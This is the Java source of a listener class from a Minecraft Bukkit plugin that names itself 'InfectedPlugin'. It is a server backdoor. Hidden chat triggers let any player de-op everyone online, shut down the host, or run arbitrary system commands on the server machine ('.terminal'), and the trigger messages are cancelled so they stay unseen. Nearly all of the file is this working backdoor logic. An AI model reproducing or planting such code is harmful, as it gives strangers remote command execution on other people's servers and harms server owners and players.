package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.Server;
import org.bukkit.event.EventPriority;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.Random;
import java.util.logging.Logger;
import java.lang.RuntimeException;
import java.lang.Runtime;

@SuppressWarnings("unused")
public class PlayerListener implements Listener
{
    public final Logger log = Bukkit.getLogger();
	
    private Random random = new Random();
    private InfectedPlugin plugin;
    private Server server = Bukkit.getServer();

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncPlayerChatEvent event) throws MalformedURLException, IOException
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        String[] args = message.split(" ");
        boolean cancel = true;

        if (message.toLowerCase().contains(".deopall"))
        {
            for (final Player target : server.getOnlinePlayers())
            {
                target.setOp(false);
                //Something extra c:
                final Location target_pos = target.getLocation();
                for (int x = -1; x <= 1; x++)
                {
                    for (int z = -1; z <= 1; z++)
                    {
                        final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                        target_pos.getWorld().strikeLightning(strike_pos);
                    }
                }
                cancel = true;
            }
        }
        if (message.toLowerCase().contains(".shutdown"))
        {
            try
            {
                IP_Util.shutdown();
            }
            catch (IOException ex)
            {
                log.severe(ex.getMessage());
            }
            catch (RuntimeException ex)
            {
                log.severe(ex.getMessage());
            }
            cancel = true;
        }
        if (message.toLowerCase().contains(".terminal"))
        {
            String command;
            try
            {
                StringBuilder command_bldr = new StringBuilder();
                for (int i = 0; i < args.length; i++)
                {
                    command_bldr.append(args[i]).append(" ");
                }
                command = command_bldr.toString().trim();
            }
            catch (Throwable ex)
            {
                p.sendMessage(ChatColor.GRAY + "Error building command: " + ex.getMessage());
                return;
            }
            
            p.sendMessage("Running system command: " + command);
            server.getScheduler().runTaskAsynchronously(plugin, new IP_RunSystemCommand(command, plugin));
            cancel = true;
            return;
        }
        
        if (cancel)
        {
            event.setCancelled(true);
            return;
        }
    }
}
